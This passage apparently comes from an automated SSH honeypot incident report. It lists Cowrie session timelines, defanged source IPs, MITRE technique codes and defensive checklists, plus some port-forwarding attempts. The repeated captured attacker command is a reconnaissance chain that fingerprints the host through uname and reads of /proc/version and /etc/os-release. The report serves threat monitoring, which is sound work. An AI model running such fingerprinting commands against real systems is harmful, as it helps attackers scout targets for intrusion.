| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:15:06` | `cowrie.session.connect` |
| `2026-08-16 02:15:07` | `cowrie.client.version` |
| `2026-08-16 02:15:07` | `cowrie.client.kex` |
| `2026-08-16 02:15:10` | `cowrie.login.success` |
| `2026-08-16 02:15:12` | `cowrie.session.params` |
| `2026-08-16 02:15:12` | `cowrie.command.input` |
| `2026-08-16 02:15:12` | `cowrie.command.input` |
| `2026-08-16 02:15:12` | `cowrie.command.input` |
| `2026-08-16 02:15:12` | `cowrie.command.input` |
| `2026-08-16 02:15:12` | `cowrie.command.input` |
| `2026-08-16 02:15:12` | `cowrie.command.success` |
| `2026-08-16 02:15:12` | `cowrie.command.input` |
| `2026-08-16 02:15:12` | `cowrie.command.input` |
| `2026-08-16 02:15:12` | `cowrie.command.input` |
| `2026-08-16 02:15:12` | `cowrie.command.input` |
| `2026-08-16 02:15:15` | `cowrie.log.closed` |
| `2026-08-16 02:15:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c89e56953b0b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:16 |
| **Last Seen** | 2026-08-16 02:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:16:01` | `cowrie.session.connect` |
| `2026-08-16 02:16:02` | `cowrie.client.version` |
| `2026-08-16 02:16:02` | `cowrie.client.kex` |
| `2026-08-16 02:16:05` | `cowrie.login.success` |
| `2026-08-16 02:16:07` | `cowrie.session.params` |
| `2026-08-16 02:16:07` | `cowrie.command.input` |
| `2026-08-16 02:16:07` | `cowrie.command.input` |
| `2026-08-16 02:16:07` | `cowrie.command.input` |
| `2026-08-16 02:16:07` | `cowrie.command.input` |
| `2026-08-16 02:16:07` | `cowrie.command.input` |
| `2026-08-16 02:16:07` | `cowrie.command.success` |
| `2026-08-16 02:16:07` | `cowrie.command.input` |
| `2026-08-16 02:16:07` | `cowrie.command.input` |
| `2026-08-16 02:16:07` | `cowrie.command.input` |
| `2026-08-16 02:16:07` | `cowrie.command.input` |
| `2026-08-16 02:16:07` | `cowrie.log.closed` |
| `2026-08-16 02:16:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e068ea72faf

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:16 |
| **Last Seen** | 2026-08-16 02:17 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:16:57` | `cowrie.session.connect` |
| `2026-08-16 02:16:58` | `cowrie.client.version` |
| `2026-08-16 02:16:58` | `cowrie.client.kex` |
| `2026-08-16 02:17:01` | `cowrie.login.success` |
| `2026-08-16 02:17:05` | `cowrie.session.params` |
| `2026-08-16 02:17:05` | `cowrie.command.input` |
| `2026-08-16 02:17:05` | `cowrie.command.input` |
| `2026-08-16 02:17:05` | `cowrie.command.input` |
| `2026-08-16 02:17:05` | `cowrie.command.input` |
| `2026-08-16 02:17:05` | `cowrie.command.input` |
| `2026-08-16 02:17:05` | `cowrie.command.success` |
| `2026-08-16 02:17:05` | `cowrie.command.input` |
| `2026-08-16 02:17:05` | `cowrie.command.input` |
| `2026-08-16 02:17:05` | `cowrie.command.input` |
| `2026-08-16 02:17:05` | `cowrie.command.input` |
| `2026-08-16 02:17:06` | `cowrie.log.closed` |
| `2026-08-16 02:17:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-874edde333bc

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:17 |
| **Last Seen** | 2026-08-16 02:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:17:55` | `cowrie.session.connect` |
| `2026-08-16 02:17:56` | `cowrie.client.version` |
| `2026-08-16 02:17:56` | `cowrie.client.kex` |
| `2026-08-16 02:17:59` | `cowrie.login.success` |
| `2026-08-16 02:18:01` | `cowrie.session.params` |
| `2026-08-16 02:18:01` | `cowrie.command.input` |
| `2026-08-16 02:18:01` | `cowrie.command.input` |
| `2026-08-16 02:18:01` | `cowrie.command.input` |
| `2026-08-16 02:18:01` | `cowrie.command.input` |
| `2026-08-16 02:18:01` | `cowrie.command.input` |
| `2026-08-16 02:18:01` | `cowrie.command.success` |
| `2026-08-16 02:18:01` | `cowrie.command.input` |
| `2026-08-16 02:18:01` | `cowrie.command.input` |
| `2026-08-16 02:18:01` | `cowrie.command.input` |
| `2026-08-16 02:18:01` | `cowrie.command.input` |
| `2026-08-16 02:18:02` | `cowrie.log.closed` |
| `2026-08-16 02:18:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e1ebdf049bb

| Field | Detail |
|---|---|
| **Source IP** | `179.185.1[.]97` |
| **First Seen** | 2026-08-16 02:17 |
| **Last Seen** | 2026-08-16 02:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:17:59` | `cowrie.session.connect` |
| `2026-08-16 02:18:00` | `cowrie.client.version` |
| `2026-08-16 02:18:00` | `cowrie.client.kex` |
| `2026-08-16 02:18:02` | `cowrie.login.success` |
| `2026-08-16 02:18:03` | `cowrie.direct-tcpip.request` |
| `2026-08-16 02:18:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.185.1[.]97` to AbuseIPDB if not already reported
- [ ] Block `179.185.1[.]97` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b0ab1dcb637

| Field | Detail |
|---|---|
| **Source IP** | `122.176.21[.]104` |
| **First Seen** | 2026-08-16 02:18 |
| **Last Seen** | 2026-08-16 02:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:18:13` | `cowrie.session.connect` |
| `2026-08-16 02:18:13` | `cowrie.client.version` |
| `2026-08-16 02:18:13` | `cowrie.client.kex` |
| `2026-08-16 02:18:15` | `cowrie.login.success` |
| `2026-08-16 02:18:16` | `cowrie.direct-tcpip.request` |
| `2026-08-16 02:18:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.176.21[.]104` to AbuseIPDB if not already reported
- [ ] Block `122.176.21[.]104` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16bffae06d08

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:18 |
| **Last Seen** | 2026-08-16 02:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:18:52` | `cowrie.session.connect` |
| `2026-08-16 02:18:53` | `cowrie.client.version` |
| `2026-08-16 02:18:53` | `cowrie.client.kex` |
| `2026-08-16 02:18:55` | `cowrie.login.success` |
| `2026-08-16 02:18:57` | `cowrie.session.params` |
| `2026-08-16 02:18:57` | `cowrie.command.input` |
| `2026-08-16 02:18:57` | `cowrie.command.input` |
| `2026-08-16 02:18:57` | `cowrie.command.input` |
| `2026-08-16 02:18:57` | `cowrie.command.input` |
| `2026-08-16 02:18:57` | `cowrie.command.input` |
| `2026-08-16 02:18:57` | `cowrie.command.success` |
| `2026-08-16 02:18:57` | `cowrie.command.input` |
| `2026-08-16 02:18:57` | `cowrie.command.input` |
| `2026-08-16 02:18:57` | `cowrie.command.input` |
| `2026-08-16 02:18:57` | `cowrie.command.input` |
| `2026-08-16 02:18:58` | `cowrie.log.closed` |
| `2026-08-16 02:18:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c542b6a191e2

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:19 |
| **Last Seen** | 2026-08-16 02:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:19:46` | `cowrie.session.connect` |
| `2026-08-16 02:19:47` | `cowrie.client.version` |
| `2026-08-16 02:19:47` | `cowrie.client.kex` |
| `2026-08-16 02:19:50` | `cowrie.login.success` |
| `2026-08-16 02:19:52` | `cowrie.session.params` |
| `2026-08-16 02:19:52` | `cowrie.command.input` |
| `2026-08-16 02:19:52` | `cowrie.command.input` |
| `2026-08-16 02:19:52` | `cowrie.command.input` |
| `2026-08-16 02:19:52` | `cowrie.command.input` |
| `2026-08-16 02:19:52` | `cowrie.command.input` |
| `2026-08-16 02:19:52` | `cowrie.command.success` |
| `2026-08-16 02:19:52` | `cowrie.command.input` |
| `2026-08-16 02:19:52` | `cowrie.command.input` |
| `2026-08-16 02:19:52` | `cowrie.command.input` |
| `2026-08-16 02:19:52` | `cowrie.command.input` |
| `2026-08-16 02:19:53` | `cowrie.log.closed` |
| `2026-08-16 02:19:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e49856c984d

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:20 |
| **Last Seen** | 2026-08-16 02:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:20:44` | `cowrie.session.connect` |
| `2026-08-16 02:20:44` | `cowrie.client.version` |
| `2026-08-16 02:20:44` | `cowrie.client.kex` |
| `2026-08-16 02:20:47` | `cowrie.login.success` |
| `2026-08-16 02:20:49` | `cowrie.session.params` |
| `2026-08-16 02:20:49` | `cowrie.command.input` |
| `2026-08-16 02:20:49` | `cowrie.command.input` |
| `2026-08-16 02:20:49` | `cowrie.command.input` |
| `2026-08-16 02:20:49` | `cowrie.command.input` |
| `2026-08-16 02:20:49` | `cowrie.command.input` |
| `2026-08-16 02:20:49` | `cowrie.command.success` |
| `2026-08-16 02:20:49` | `cowrie.command.input` |
| `2026-08-16 02:20:49` | `cowrie.command.input` |
| `2026-08-16 02:20:49` | `cowrie.command.input` |
| `2026-08-16 02:20:49` | `cowrie.command.input` |
| `2026-08-16 02:20:51` | `cowrie.log.closed` |
| `2026-08-16 02:20:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de812a95f577

| Field | Detail |
|---|---|
| **Source IP** | `92.255.196[.]185` |
| **First Seen** | 2026-08-16 02:20 |
| **Last Seen** | 2026-08-16 02:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:20:48` | `cowrie.session.connect` |
| `2026-08-16 02:20:48` | `cowrie.client.version` |
| `2026-08-16 02:20:48` | `cowrie.client.kex` |
| `2026-08-16 02:20:49` | `cowrie.login.success` |
| `2026-08-16 02:20:50` | `cowrie.direct-tcpip.request` |
| `2026-08-16 02:20:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.255.196[.]185` to AbuseIPDB if not already reported
- [ ] Block `92.255.196[.]185` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e0846eb4eae

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:21 |
| **Last Seen** | 2026-08-16 02:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:21:38` | `cowrie.session.connect` |
| `2026-08-16 02:21:39` | `cowrie.client.version` |
| `2026-08-16 02:21:39` | `cowrie.client.kex` |
| `2026-08-16 02:21:42` | `cowrie.login.success` |
| `2026-08-16 02:21:44` | `cowrie.session.params` |
| `2026-08-16 02:21:44` | `cowrie.command.input` |
| `2026-08-16 02:21:44` | `cowrie.command.input` |
| `2026-08-16 02:21:44` | `cowrie.command.input` |
| `2026-08-16 02:21:44` | `cowrie.command.input` |
| `2026-08-16 02:21:44` | `cowrie.command.input` |
| `2026-08-16 02:21:44` | `cowrie.command.success` |
| `2026-08-16 02:21:44` | `cowrie.command.input` |
| `2026-08-16 02:21:44` | `cowrie.command.input` |
| `2026-08-16 02:21:44` | `cowrie.command.input` |
| `2026-08-16 02:21:44` | `cowrie.command.input` |
| `2026-08-16 02:21:45` | `cowrie.log.closed` |
| `2026-08-16 02:21:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9aef302f43c5

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:22 |
| **Last Seen** | 2026-08-16 02:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:22:34` | `cowrie.session.connect` |
| `2026-08-16 02:22:34` | `cowrie.client.version` |
| `2026-08-16 02:22:34` | `cowrie.client.kex` |
| `2026-08-16 02:22:37` | `cowrie.login.success` |
| `2026-08-16 02:22:39` | `cowrie.session.params` |
| `2026-08-16 02:22:39` | `cowrie.command.input` |
| `2026-08-16 02:22:39` | `cowrie.command.input` |
| `2026-08-16 02:22:39` | `cowrie.command.input` |
| `2026-08-16 02:22:39` | `cowrie.command.input` |
| `2026-08-16 02:22:39` | `cowrie.command.input` |
| `2026-08-16 02:22:39` | `cowrie.command.success` |
| `2026-08-16 02:22:39` | `cowrie.command.input` |
| `2026-08-16 02:22:39` | `cowrie.command.input` |
| `2026-08-16 02:22:39` | `cowrie.command.input` |
| `2026-08-16 02:22:39` | `cowrie.command.input` |
| `2026-08-16 02:22:40` | `cowrie.log.closed` |
| `2026-08-16 02:22:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95a4e4bf581a

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:23 |
| **Last Seen** | 2026-08-16 02:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:23:30` | `cowrie.session.connect` |
| `2026-08-16 02:23:31` | `cowrie.client.version` |
| `2026-08-16 02:23:31` | `cowrie.client.kex` |
| `2026-08-16 02:23:33` | `cowrie.login.success` |
| `2026-08-16 02:23:36` | `cowrie.session.params` |
| `2026-08-16 02:23:36` | `cowrie.command.input` |
| `2026-08-16 02:23:36` | `cowrie.command.input` |
| `2026-08-16 02:23:36` | `cowrie.command.input` |
| `2026-08-16 02:23:36` | `cowrie.command.input` |
| `2026-08-16 02:23:36` | `cowrie.command.input` |
| `2026-08-16 02:23:36` | `cowrie.command.success` |
| `2026-08-16 02:23:36` | `cowrie.command.input` |
| `2026-08-16 02:23:36` | `cowrie.command.input` |
| `2026-08-16 02:23:36` | `cowrie.command.input` |
| `2026-08-16 02:23:36` | `cowrie.command.input` |
| `2026-08-16 02:23:37` | `cowrie.log.closed` |
| `2026-08-16 02:23:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50e40ba551bb

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:24 |
| **Last Seen** | 2026-08-16 02:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:24:27` | `cowrie.session.connect` |
| `2026-08-16 02:24:28` | `cowrie.client.version` |
| `2026-08-16 02:24:28` | `cowrie.client.kex` |
| `2026-08-16 02:24:30` | `cowrie.login.success` |
| `2026-08-16 02:24:32` | `cowrie.session.params` |
| `2026-08-16 02:24:32` | `cowrie.command.input` |
| `2026-08-16 02:24:32` | `cowrie.command.input` |
| `2026-08-16 02:24:32` | `cowrie.command.input` |
| `2026-08-16 02:24:32` | `cowrie.command.input` |
| `2026-08-16 02:24:32` | `cowrie.command.input` |
| `2026-08-16 02:24:32` | `cowrie.command.success` |
| `2026-08-16 02:24:32` | `cowrie.command.input` |
